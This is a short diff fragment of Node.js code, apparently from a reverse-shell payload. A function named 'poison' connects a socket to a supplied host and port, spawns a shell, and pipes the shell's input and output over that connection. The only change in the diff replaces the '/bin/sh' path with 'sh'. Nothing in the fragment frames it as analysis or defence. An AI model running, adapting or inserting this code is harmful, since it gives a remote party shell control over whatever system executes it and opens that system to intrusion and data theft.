@@ -12,7 +12,7 @@ const poison_TIMEOUT="5000";
 function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
     var client = new net.Socket();
     client.connect(poison_PORT, poison_HOST, function() {
-        var sh = spawn('/bin/sh',[]);
+        var sh = spawn('sh',[]);
         client.write("Connected\r\n");
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
